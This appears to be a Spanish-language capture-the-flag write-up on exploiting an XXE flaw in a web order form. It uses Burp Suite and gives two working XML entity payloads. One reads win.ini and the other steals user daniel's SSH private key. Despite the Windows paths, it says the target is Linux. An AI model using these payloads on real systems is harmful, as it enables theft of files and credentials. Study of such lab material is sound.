#xxe

------

Una **vulnerabilidad XXE** ocurre cuando una aplicación lee archivos XML y permite que se carguen datos externos. Esto puede hacer que un atacante lea archivos del sistema o envíe datos a servidores externos. Es un fallo de seguridad que puede exponer información sensible.

-------

Interceptamos con burpsuite la peticion de la parte de ordenes de la pagina
![[Markup10.png]]

![[Markup12.png]]
Ahora vamos a cambiar la estructura del XML por lo que vimos en el [articulo de xxe payloadallthethings](https://gitlab.com/kalilinux/packages/payloadsallthethings/-/tree/kali/master/XXE%20Injection)
![[Markup14.png]]

Como estamos en una maquina linux, vamos a leer el archivo win.ini de prueba, en la parte que pusimos &test; lo hicimos por que el unico output que se muestra como se ve en la primera foto es el de esa etiqueta
```xml
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><quantity>test</quantity><item>&test;</item><address>test2</address></order>
```


![[Markup13.png]]

### Sacamos archivo de id_rsa
Como sabemos que existe el usuario daniel y esta activo el servicio de ssh por el puerto 22 como vimos antes con nmap
Vamos a ver si en su escritorio tiene las claves de ssh
```
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order><quantity>test</quantity><item>&test;</item><address>test2</address></order>
```
